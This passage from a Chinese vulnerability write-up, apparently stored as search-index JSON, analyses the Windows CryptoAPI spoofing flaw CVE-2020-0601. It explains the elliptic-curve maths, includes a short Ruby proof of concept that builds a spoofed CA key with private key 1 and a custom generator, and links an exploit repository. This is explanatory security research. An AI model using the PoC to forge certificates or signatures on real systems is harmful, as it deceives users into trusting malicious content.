\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u4e4b\u6240\u4ee5\u53ef\u9760\u662f\u56e0\u4e3a\u5b83\u4eec\u5229\u7528\u4e86\u516c\u94a5\u5bc6\u7801\u9886\u57df\u7684\u5355\u5411\u51fd\u6570\u539f\u7406\uff0c\u6b63\u5411\u64cd\u4f5c\u975e\u5e38\u7b80\u5355\uff0c\u800c\u9006\u5411\u64cd\u4f5c\u975e\u5e38\u56f0\u96be\u3002 \u7531G\uff08\u57fa\u70b9\uff09\u51fa\u53d1\uff0c\u8fdb\u884ck\uff08\u79c1\u94a5\uff09\u6b21\u53d8\u6362\uff0c\u53ea\u8981\u6309\u90e8\u5c31\u73ed\u5730\u8ba1\u7b97\uff0c\u5c31\u80fd\u5f88\u5bb9\u6613\u5730\u5f97\u5230\u7ec8\u70b9K\uff08\u516c\u94a5\uff09\u7684\u503c\u3002 \u5df2\u77e5\u8d77\u70b9G\uff08\u57fa\u70b9\uff09\u548c\u7ec8\u70b9K\uff08\u516c\u94a5\uff09\uff0c\u8981\u9006\u63a8\u5f97\u5230\u79fb\u52a8\u6b21\u6570k\uff08\u79c1\u94a5\uff09\u5219\u662f\u4e00\u4e2a\u5f88\u96be\u7684\u95ee\u9898\uff08\u6700\u4f73\u7b97\u6cd5\u4e5f\u8fbe\u5230\u4e86\u5168\u6307\u6570\u590d\u6742\u5ea6\uff09 \u76f8\u6bd4\u4f20\u7edfRSA\u52a0\u5bc6\u7b97\u6cd5\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u5177\u6709\u7740\u5929\u751f\u7684\u4f18\u52bf\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u9006\u5411\u8fc7\u7a0b\u76f8\u6bd4RSA\u6709\u7740\u66f4\u5927\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u3002\u5728\u5bc6\u94a5\u957f\u5ea6\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u76f8\u6bd4RSA\u5177\u6709\u66f4\u597d\u7684\u5b89\u5168\u5f3a\u5ea6\u3002\u4e00\u822c\u8ba4\u4e3a\uff0c160\u6bd4\u7279\u7684\u692d\u5706\u66f2\u7ebf\u5bc6\u94a5\u5373\u53ef\u63d0\u4f9b\u4e0e1024\u6bd4\u7279\u7684RSA\u5bc6\u94a5\u76f8\u5f53\u7684\u5b89\u5168\u5f3a\u5ea6\u3002 \u8f83\u77ed\u7684\u5bc6\u94a5\u4e5f\u610f\u5473\u7740\u66f4\u5c11\u7684\u5b58\u50a8\u7a7a\u95f4\u3001\u66f4\u5feb\u7684\u52a0\u89e3\u5bc6\u901f\u5ea6\u548c\u66f4\u5c11\u7684\u5e26\u5bbd\u6d88\u8017\uff0c\u6b63\u56e0\u4e3a\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u8fd9\u4e9b\u4f18\u52bf\uff0c\u5b83\u88ab\u7528\u4e8eWindows\u7684\u7b7e\u540d\u7cfb\u7edf\u3001https\u7684\u8bc1\u4e66\u3001\u6bd4\u7279\u5e01\u7cfb\u7edf\u548c\u4e2d\u56fd\u7684\u4e8c\u4ee3\u8eab\u4efd\u8bc1\u7cfb\u7edf\u4e2d\u3002 \u867d\u7136\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u5177\u6709\u7740\u8bb8\u591a\u4f18\u52bf\uff0c\u7eaf\u7b97\u6cd5\u89d2\u5ea6\u7834\u89e3\u96be\u5ea6\u6781\u5927\uff0c\u5fae\u8f6f\u5bf9\u6b64\u7b97\u6cd5\u7684\u5b9e\u73b0\u7684\u7f3a\u6f0f\u5374\u7ed9\u6f0f\u6d1e\u5229\u7528\u63d0\u4f9b\u4e86\u53ef\u4e58\u4e4b\u673a\u3002\u56de\u5230\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u6700\u57fa\u672c\u7684\u7b49\u5f0f K=kG\uff0c\u9996\u5148\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u867d\u7136\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u57fa\u70b9G\u548c\u516c\u94a5K\uff0c\u8981\u6c42\u89e3\u79c1\u94a5k\u5f88\u56f0\u96be\uff0c\u4f46\u662f\u5982\u679c\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u57fa\u70b9G\uff0c\u8981\u6784\u9020\u4e00\u5bf9k\u548cG\u4f7f\u7b49\u5f0f\u6210\u7acb\u5374\u6781\u5176\u7b80\u5355\uff1b\u6700\u7b80\u5355\u7684\u60c5\u51b5\uff0c\u4ee4\u57fa\u70b9G=K\uff0c\u5219\u79c1\u94a5k=1\uff0c\u8fd9\u6837\u4e00\u5bf9\u57fa\u70b9\u548c\u79c1\u94a5\u53ef\u4ee5\u4f7f\u7b49\u5f0f\u6210\u7acb\uff0c\u4e5f\u662f\u6709\u6548\u7684\u89e3\u3002 \u5728\u6b63\u5e38\u7684\u6807\u51c6\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5\u4e2d\uff0c\u57fa\u70b9G\u5e76\u4e0d\u662f\u968f\u610f\u6307\u5b9a\u7684\uff0c\u800c\u662f\u6709\u56fa\u5b9a\u7684\u503c\uff08\u6807\u51c6\u7684\u4f5c\u7528\uff0c\u4fbf\u662f\u5bf9\u57fa\u70b9G\u7b49\u53c2\u6570\u7684\u9009\u62e9\u505a\u51fa\u89c4\u5b9a\uff09\uff0c\u4f8b\u5982\u5728secp256r1\u7248\u672c\u7684\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5\u4e2d\uff0c\u57fa\u70b9G\u5e94\u5f53\u4e3a\u6807\u51c6\u89c4\u5b9a\u7684\u56fa\u5b9a\u503c\uff0c\u5982\u679c\u5bf9\u53c2\u6570\u4e0d\u52a0\u9a8c\u8bc1\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4f20\u5165\u7684\u57fa\u70b9G\u7684\u503c\uff08\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570\uff09\uff0c\u4e0a\u9762\u7684\u79c1\u94a5k=1\u7684\u7279\u6b8a\u89e3\u5373\u53ef\u6210\u7acb\u3002 \u5728\u6709\u6f0f\u6d1e\u7248\u672c\u7684crypt32.dll\u4e2d\u9a8c\u8bc1\u4f7f\u7528ECC\u7b97\u6cd5\u7b7e\u540d\u90e8\u5206\u7684\u51fd\u6570\u6070\u6070\u662f\u8fd9\u4e2a\u60c5\u51b5\uff0c\u539f\u5148\u7684\u51fd\u6570\u672a\u52a0\u53c2\u6570\u9a8c\u8bc1\uff0c\u53c2\u4e0e\u8ba1\u7b97\u7684\u57fa\u70b9G\u7684\u5185\u5bb9\u7531\u88ab\u9a8c\u8bc1\u7684\u8bc1\u4e66\u968f\u610f\u6307\u5b9a\uff0c\u4f7f\u672a\u6388\u6743\u7684\u8bc1\u4e66\u80fd\u591f\u6784\u5efa\u79c1\u94a5k=1\u7684\u7279\u6b8a\u89e3\u6765\u6210\u529f\u901a\u8fc7\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u7b7e\u540d\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u3002 \u8ba9\u6211\u4eec\u4ee5CVE-2020-0601\u7684\u4e00\u4e2aPOC\u4e3a\u4f8b\u6765\u89e3\u6790\u865a\u5047\u5bc6\u94a5\u7684\u6784\u5efa\u8fc7\u7a0b\uff1a require 'openssl' raw = File . read ARGV [ 0 ] # \u8bfb\u53d6\u4f7f\u7528ECC\u7b97\u6cd5\u7684\u8bc1\u4e66\u6587\u4ef6 ca = OpenSSL :: X509 :: Certificate . new ( raw ) # \u8bfb\u53d6\u4f7f\u7528ECC\u7b97\u6cd5\u7684\u8bc1\u4e66 ca_key = ca . public_key # \u4ece\u8bc1\u4e66\u4e2d\u63d0\u53d6\u516c\u94a5ca_key ca_key . private_key = 1 # \u8bbe\u7f6e\u79c1\u94a5\u4e3a1\uff0c\u4f7f\u5f97\u516c\u94a5K==1*\u57fa\u70b9G\u7684\u7b49\u5f0f\u6210\u7acb group = ca_key . group group . set_generator ( ca_key . public_key , group . order , group . cofactor ) group . asn1_flag = OpenSSL :: PKey :: EC :: EXPLICIT_CURVE ca_key . group = group # \u5229\u7528\u6784\u5efa\u7684\u5047\u57fa\u70b9G\u548c\u5047\u5bc6\u94a5k\u8bbe\u7f6e\u65b0group File . open ( \"spoofed_ca.key\" , 'w' ) { | f | f . write ca_key . to_pem } # \u5c06\u65b0\u7684group\u5199\u5165\u6587\u4ef6 \u4fee\u8865\u540e\u7684Crypt32.dll\u4e2d\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u51fd\u6570\u5df2\u52a0\u5165\u4e86\u53c2\u6570\u9a8c\u8bc1\u7684\u90e8\u5206\uff0c\u89e3\u51b3\u4e86\u7531\u81ea\u7531\u6307\u5b9a\u53c2\u6570G\u5bfc\u81f4\u7684\u6784\u9020\u7b2c\u4e8c\u4e2a\u7279\u6b8a\u7684\u6709\u6548\u5bc6\u94a5\u7684\u95ee\u9898\u3002 \u4e00\u5904\u9a8c\u8bc1\u673a\u5236\u7684\u5931\u8bef\u5bfc\u81f4\u4fe1\u4efb\u94fe\u7684\u8fde\u9501\u53cd\u5e94\u3002 \u73b0\u4ee3\u7684\u5b89\u5168\u7cfb\u7edf\u4e2d\u5b58\u5728\u7740\u201c\u4fe1\u4efb\u94fe\u201d\u7684\u6982\u5ff5\uff0c\u4fe1\u4efb\u94fe\u7684\u4e0a\u4e0b\u7ea7\u5b58\u5728\u4e00\u79cd\u7c7b\u4f3c\u5355\u5411\u62c5\u4fdd\u7684\u5173\u7cfb\uff0c\u5b50\u7ea7\u8bc1\u4e66\u7684\u53ef\u9760\u6027\u7531\u7b7e\u540d\u5176\u7684\u7236\u7ea7\u8bc1\u4e66\u62c5\u4fdd\u3002\u7b7e\u540d\u65f6\u7531\u6839\u8bc1\u4e66\u5f00\u59cb\u4e00\u7ea7\u7ea7\u5411\u4e0b\u7b7e\u540d\uff0c\u9a8c\u8bc1\u65f6\u5219\u9010\u5c42\u6eaf\u6e90\u9a8c\u8bc1\uff0c\u76f4\u5230\u627e\u5230\u4fe1\u4efb\u7684\u6839\u8bc1\u4e66\u6587\u4ef6\uff0c\u6784\u6210\u4e86\u4e00\u6761\u4fe1\u4efb\u94fe\u3002\u4f4d\u4e8e\u6574\u4e2a\u201c\u4fe1\u4efb\u94fe\u201d\u6700\u4e0a\u65b9\u7684\u662f\u6700\u4e3a\u91cd\u8981\u4e0d\u9700\u8981\u81ea\u8bc1\u8eab\u4efd\u7684\u6839\u8bc1\u4e66\u3002\u6839\u8bc1\u4e66\u4e00\u822c\u968f\u7cfb\u7edf\u9644\u5e26\u6216\u7531\u7ba1\u7406\u5458\u5b89\u88c5\u5728\u7cfb\u7edf\u5185\u3002 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5b58\u5728\u5219\u4f7f\u5f97\u6784\u9020\u7684\u65e0\u6548\u7b7e\u540d\u901a\u8fc7\u4e86\u9a8c\u8bc1\u673a\u5236\uff0c\u4f7f\u672c\u5e94\u65ad\u88c2\u7684\u4fe1\u4efb\u94fe\u88ab\u5229\u7528\uff0c\u9010\u7ea7\u62c5\u4fdd\u7ee7\u7eed\u4e0b\u53bb\uff0c\u6700\u7ec8\u4f7f\u975e\u6cd5\u5185\u5bb9\u83b7\u5f97\u4e86\u8bc1\u4e66\u6240\u6709\u8005\u7684\u5408\u6cd5\u7b7e\u540d\u8eab\u4efd\u3002 \u6f0f\u6d1e\u5229\u7528 \u00b6 https://github.com/ollypwn/CurveBall \u53c2\u8003\u6587\u7ae0 \u00b6 cve-2020-0601-windows-cryptoapi\u6b3a\u9a97\u6f0f\u6d1e\u5206\u6790","title":"Windows CryptoAPI\u6b3a\u9a97\u6f0f\u6d1e CVE-2020-0601"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#windows-cryptoapi\u6b3a\u9a97\u6f0f\u6d1e-cve-2020-0601","text":"","title":"Windows CryptoAPI\u6b3a\u9a97\u6f0f\u6d1e CVE-2020-0601"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u6f0f\u6d1e\u63cf\u8ff0","text":"1\u670815\u65e5\uff0c\u5fae\u8f6f\u53d1\u5e03\u4e86\u9488\u5bf9CVE-2020-0601\u7684\u5b89\u5168\u8865\u4e01\uff0c\u8be5\u6f0f\u6d1e\u662f\u5fae\u8f6f\u5728\u5b9e\u73b0\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u6570\u5b57\u8bc1\u4e66\u9a8c\u8bc1\u65f6\u4ea7\u751f\uff0c\u53ef\u88ab\u5229\u7528\u4e8e\u4f2a\u9020\u6765\u81ea\u53ef\u4fe1\u4efb\u6765\u6e90\u7684\u7b7e\u540d\u6216\u8bc1\u4e66\uff0c\u5e76\u4e14\u56e0\u5176\u4e1a\u52a1\u7279\u6027\u4f1a\u884d\u751f\u51fa\u591a\u79cd\u653b\u51fb\u5411\u91cf\uff0c\u5177\u6709\u6781\u9ad8\u7684\u53ef\u5229\u7528\u4ef7\u503c\u548c\u6781\u5927\u7684\u6f5c\u5728\u7834\u574f\u529b\uff0cWin 10\u548cwindows server 2016 & 2019\u4e5f\u90fd\u5728\u5176\u5f71\u54cd\u8303\u56f4\u5185\u3002\u8be5\u6f0f\u6d1e\u7531\u7f8e\u56fdNSA\u56fd\u5bb6\u5b89\u5168\u5c40\u53d1\u73b0\u540e\u6c47\u62a5\u7ed9\u5fae\u8f6f\u516c\u53f8\uff0c\u4e5f\u88ab\u8ba4\u4e3a\u662f\u7b2c\u4e00\u4e2aNSA\u516c\u5f00\u62ab\u9732\u7684\u8f6f\u4ef6\u7cfb\u7edf\u6f0f\u6d1e\uff0c\u5f53\u7136\u4e5f\u6709\u53ef\u80fd\u5b58\u5728\u5176\u7279\u6b8a\u7684\u6218\u672f\u76ee\u7684\u3002\u7eff\u76df\u79d1\u6280M01N\u653b\u51fb\u5b89\u5168\u7814\u7a76\u56e2\u961f\u5bf9\u6b64\u6f0f\u6d1e\u539f\u7406\u8fdb\u884c\u4e86\u8be6\u7ec6\u5206\u6790\u5e76\u590d\u73b0\u4e86\u591a\u79cd\u53ef\u80fd\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u63d0\u51fa\u4e86\u8be6\u7ec6\u7684\u68c0\u6d4b\u53ca\u6574\u6539\u65b9\u6848\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u5e26\u6709\u6307\u5b9a\u53c2\u6570\u7684ECC\u5bc6\u94a5\u7684\u8bc1\u4e66\u7684Microsoft Windows\u7248\u672c \u4f9d\u8d56\u4e8eWindows CryptoAPI\u7684\u5e94\u7528\u7a0b\u5e8f","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20CryptoAPI%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2020-0601/#\u6f0f\u6d1e\u539f\u7406","text":"CVE-2020-0601\u7684\u6839\u6e90\u662f\u5fae\u8f6f\u7684\u52a0\u5bc6\u5e93crypt32.dll\u4e2d\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u5b9e\u73b0\u95ee\u9898\uff0c\u9996\u5148\u6211\u4eec\u6765\u4e86\u89e3\u4e00\u4e0b\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u57fa\u672c\u539f\u7406\u3002 \u8981\u5f62\u8c61\u5730\u7406\u89e3\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff0c\u53ef\u4ee5\u7ed3\u5408\u56fe\u5f62\u6765\u770b\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u7b26\u5408\u692d\u5706\u66f2\u7ebf\u7684\u65b9\u7a0by2 = x3 + ax + b\uff0c\u56fe\u50cf\u5982\u4e0b\uff1a \u692d\u5706\u66f2\u7ebf\u5177\u6709\u7684\u4e00\u4e9b\u72ec\u7279\u7684\u6027\u8d28\u4f7f\u5b83\u9002\u5408\u7528\u4e8e\u52a0\u5bc6\u7b97\u6cd5\uff1a \u692d\u5706\u66f2\u7ebf\u5173\u4e8ex\u8f74\u5bf9\u79f0 \u4efb\u4f55\u4e00\u6761\u975e\u5782\u76f4\u7684\u7ebf\u4e0e\u66f2\u7ebf\u6700\u591a\u6709\u4e09\u4e2a\u70b9\u76f8\u4ea4 \u66f2\u7ebf\u662f\u5149\u6ed1\u7684\uff0c\u5373\u66f2\u7ebf\u7684\u6240\u6709\u70b9\u90fd\u6ca1\u6709\u4e24\u4e2a\u6216\u8005\u4e24\u4e2a\u4ee5\u4e0a\u7684\u4e0d\u540c\u7684\u5207\u7ebf \u5728\u692d\u5706\u66f2\u7ebf\u4e0a\u4efb\u610f\u4e24\u70b9A\u3001B\uff08\u82e5A\u3001B\u91cd\u5408\u5219\u4f5cA\u7684\u5207\u7ebf\uff09\uff0c\u4f5c\u76f4\u7ebf\u4ea4\u4e8e\u692d\u5706\u66f2\u7ebf\u53e6\u4e00\u70b9C \uff0c\u8fc7C \u505ay\u8f74\u7684\u5e73\u884c\u7ebf\u4e0e\u692d\u5706\u66f2\u7ebf\u4ea4\u4e8eC\u70b9\uff0c\u5b9a\u4e49A+B=C\u3002\u692d\u5706\u66f2\u7ebf\u7684\u52a0\u6cd5\u7b26\u5408\u4ea4\u6362\u5f8b\u548c\u7ed3\u5408\u5f8b\u3002 \u5982\u679cA\u3001B\u662f\u540c\u4e00\u4e2a\u70b9\uff0c\u5219\u8fc7A\u4f5c\u692d\u5706\u66f2\u7ebf\u7684\u5207\u7ebf\uff0c\u4ee5\u540c\u6837\u7684\u65b9\u6cd5\u5f97\u5230\u5bf9\u5e94\u7684\u7ed3\u679c C=2A \u3002 \u63a5\u4e0b\u6765\u662f\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u76f8\u5173\u7684\u91cd\u70b9\uff0c\u5982\u679c\u5bf9\u591a\u4e2aA\u8fdb\u884c\u7d2f\u52a0,\u5219\u53ef\u4f9d\u6b21\u7d2f\u52a0\u8fde\u7ebf\u5f97\u5230nA\u7684\u503c \u3002 \u8d77\u70b9\u4e3aA\uff0c\u7ec8\u70b9D=3A\uff0c\u9636\u4e3a3 \u3002 \u8d77\u70b9\u4e3aA\uff0c\u7ec8\u70b9G=4A\uff0c\u9636\u4e3a4\u3002 \u692d\u5706\u66f2\u7ebf\u52a0\u5bc6 \u8003\u8651K=kG\uff0c\u5176\u4e2dK\u3001G\u4e3a\u692d\u5706\u66f2\u7ebfEp(a,b)\u4e0a\u7684\u70b9\uff0cn\u4e3aG\u7684\u9636\u3002k\u4e3a\u5c0f\u4e8en\u7684\u6574\u6570\u3002\u5219\u7ed9\u5b9ak\u548cG\uff0c\u6839\u636e\u52a0\u6cd5\u6cd5\u5219\uff0c\u8ba1\u7b97K\u5f88\u5bb9\u6613\uff08\u53ea\u8981\u9010\u6b21\u6c42\u89e3\uff09\u4f46\u53cd\u8fc7\u6765\uff0c\u7ed9\u5b9aK\u548cG\uff0c\u6c42k\u5c31\u975e\u5e38\u56f0\u96be\u3002\u56e0\u4e3a\u5b9e\u9645\u4f7f\u7528\u4e2d\u7684ECC\u539f\u5219\u4e0a\u628a\u79c1\u94a5k\u53d6\u5f97\u76f8\u5f53\u5927\uff0cn\u4e5f\u76f8\u5f53\u5927\uff0c\u4e14\u692d\u5706\u66f2\u7ebf\u4e0d\u518d\u8fde\u7eed\u800c\u662f\u5728\u5b9e\u6570\u5185\u79bb\u6563\u7684\u503c\uff0c\u8981\u628an\u4e2a\u89e3\u70b9\u9010\u4e00\u7b97\u51fa\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\u3002\u8fd9\u5c31\u662f\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u7684\u6570\u5b66\u4f9d\u636e \u3002 \u70b9G\u79f0\u4e3a\u57fa\u70b9 k(k<n)\u4e3a\u79c1\u6709\u5bc6\u94a5 K\u4e3a\u516c\u5f00\u5bc6\u94a5 \u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff08ECC\uff09\u548cRSA\u4e00\u6837\u662f\u4e00\u79cd\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\uff0c\u5bf9\u539f\u59cb\u6570\u636e\u4ee5\u516c\u94a5\u52a0\u5bc6\uff0c\u4ee5\u79c1\u94a5\u89e3\u5bc6\uff0c\u5373\u4fbf\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u6587\u548c\u516c\u94a5\u4e5f\u65e0\u6cd5\uff08\u5728\u5408\u7406\u7684\u65f6\u95f4\u6216\u4ee3\u4ef7\u4e0b\uff09\u89e3\u5bc6\u83b7\u53d6\u660e\u6587\u3002 \u540c\u6837\u7684\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\uff08ECC\uff09\u4e5f\u88ab\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\uff0c\u4ee5\u79c1\u94a5\u52a0\u5bc6\u751f\u6210\u7b7e\u540d\uff0c\u4ee5\u516c\u94a5\u89e3\u5bc6\u9a8c\u8bc1\u7b7e\u540d\uff0c\u5982\u679c\u548c\u539f\u6587\u4e00\u6837\u5219\u7b7e\u540d\u9a8c\u8bc1\u6210\u529f\u3002 \u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u4e4b\u6240\u4ee5\u53ef\u9760\u662f\u56e0\u4e3a\u5b83\u4eec\u5229\u7528\u4e86\u516c\u94a5\u5bc6\u7801\u9886\u57df\u7684\u5355\u5411\u51fd\u6570\u539f\u7406\uff0c\u6b63\u5411\u64cd\u4f5c\u975e\u5e38\u7b80\u5355\uff0c\u800c\u9006\u5411\u64cd\u4f5c\u975e\u5e38\u56f0\u96be\u3002 \u7531G\uff08\u57fa\u70b9\uff09\u51fa\u53d1\uff0c\u8fdb\u884ck\uff08\u79c1\u94a5\uff09\u6b21\u53d8\u6362\uff0c\u53ea\u8981\u6309\u90e8\u5c31\u73ed\u5730\u8ba1\u7b97\uff0c\u5c31\u80fd\u5f88\u5bb9\u6613\u5730\u5f97\u5230\u7ec8\u70b9K\uff08\u516c\u94a5\uff09\u7684\u503c\u3002 \u5df2\u77e5\u8d77\u70b9G\uff08\u57fa\u70b9\uff09\u548c\u7ec8\u70b9K\uff08\u516c\u94a5\uff09\uff0c\u8981\u9006\u63a8\u5f97\u5230\u79fb\u52a8\u6b21\u6570k\uff08\u79c1\u94a5\uff09\u5219\u662f\u4e00\u4e2a\u5f88\u96be\u7684\u95ee\u9898\uff08\u6700\u4f73\u7b97\u6cd5\u4e5f\u8fbe\u5230\u4e86\u5168\u6307\u6570\u590d\u6742\u5ea6\uff09 \u76f8\u6bd4\u4f20\u7edfRSA\u52a0\u5bc6\u7b97\u6cd5\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u5177\u6709\u7740\u5929\u751f\u7684\u4f18\u52bf\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u9006\u5411\u8fc7\u7a0b\u76f8\u6bd4RSA\u6709\u7740\u66f4\u5927\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u3002\u5728\u5bc6\u94a5\u957f\u5ea6\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u76f8\u6bd4RSA\u5177\u6709\u66f4\u597d\u7684\u5b89\u5168\u5f3a\u5ea6\u3002\u4e00\u822c\u8ba4\u4e3a\uff0c160\u6bd4\u7279\u7684\u692d\u5706\u66f2\u7ebf\u5bc6\u94a5\u5373\u53ef\u63d0\u4f9b\u4e0e1024\u6bd4\u7279\u7684RSA\u5bc6\u94a5\u76f8\u5f53\u7684\u5b89\u5168\u5f3a\u5ea6\u3002 \u8f83\u77ed\u7684\u5bc6\u94a5\u4e5f\u610f\u5473\u7740\u66f4\u5c11\u7684\u5b58\u50a8\u7a7a\u95f4\u3001\u66f4\u5feb\u7684\u52a0\u89e3\u5bc6\u901f\u5ea6\u548c\u66f4\u5c11\u7684\u5e26\u5bbd\u6d88\u8017\uff0c\u6b63\u56e0\u4e3a\u692d\u5706\u52a0\u5bc6\u7b97\u6cd5\u7684\u8fd9\u4e9b\u4f18\u52bf\uff0c\u5b83\u88ab\u7528\u4e8eWindows\u7684\u7b7e\u540d\u7cfb\u7edf\u3001https\u7684\u8bc1\u4e66\u3001\u6bd4\u7279\u5e01\u7cfb\u7edf\u548c\u4e2d\u56fd\u7684\u4e8c\u4ee3\u8eab\u4efd\u8bc1\u7cfb\u7edf\u4e2d\u3002 \u867d\u7136\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u7b97\u6cd5\u5177\u6709\u7740\u8bb8\u591a\u4f18\u52bf\uff0c\u7eaf\u7b97\u6cd5\u89d2\u5ea6\u7834\u89e3\u96be\u5ea6\u6781\u5927\uff0c\u5fae\u8f6f\u5bf9\u6b64\u7b97\u6cd5\u7684\u5b9e\u73b0\u7684\u7f3a\u6f0f\u5374\u7ed9\u6f0f\u6d1e\u5229\u7528\u63d0\u4f9b\u4e86\u53ef\u4e58\u4e4b\u673a\u3002\u56de\u5230\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u6700\u57fa\u672c\u7684\u7b49\u5f0f K=kG\uff0c\u9996\u5148\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u867d\u7136\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u57fa\u70b9G\u548c\u516c\u94a5K\uff0c\u8981\u6c42\u89e3\u79c1\u94a5k\u5f88\u56f0\u96be\uff0c\u4f46\u662f\u5982\u679c\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u57fa\u70b9G\uff0c\u8981\u6784\u9020\u4e00\u5bf9k\u548cG\u4f7f\u7b49\u5f0f\u6210\u7acb\u5374\u6781\u5176\u7b80\u5355\uff1b\u6700\u7b80\u5355\u7684\u60c5\u51b5\uff0c\u4ee4\u57fa\u70b9G=K\uff0c\u5219\u79c1\u94a5k=1\uff0c\u8fd9\u6837\u4e00\u5bf9\u57fa\u70b9\u548c\u79c1\u94a5\u53ef\u4ee5\u4f7f\u7b49\u5f0f\u6210\u7acb\uff0c\u4e5f\u662f\u6709\u6548\u7684\u89e3\u3002 \u5728\u6b63\u5e38\u7684\u6807\u51c6\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5\u4e2d\uff0c\u57fa\u70b9G\u5e76\u4e0d\u662f\u968f\u610f\u6307\u5b9a\u7684\uff0c\u800c\u662f\u6709\u56fa\u5b9a\u7684\u503c\uff08\u6807\u51c6\u7684\u4f5c\u7528\uff0c\u4fbf\u662f\u5bf9\u57fa\u70b9G\u7b49\u53c2\u6570\u7684\u9009\u62e9\u505a\u51fa\u89c4\u5b9a\uff09\uff0c\u4f8b\u5982\u5728secp256r1\u7248\u672c\u7684\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5\u4e2d\uff0c\u57fa\u70b9G\u5e94\u5f53\u4e3a\u6807\u51c6\u89c4\u5b9a\u7684\u56fa\u5b9a\u503c\uff0c\u5982\u679c\u5bf9\u53c2\u6570\u4e0d\u52a0\u9a8c\u8bc1\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4f20\u5165\u7684\u57fa\u70b9G\u7684\u503c\uff08\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570\uff09\uff0c\u4e0a\u9762\u7684\u79c1\u94a5k=1\u7684\u7279\u6b8a\u89e3\u5373\u53ef\u6210\u7acb\u3002 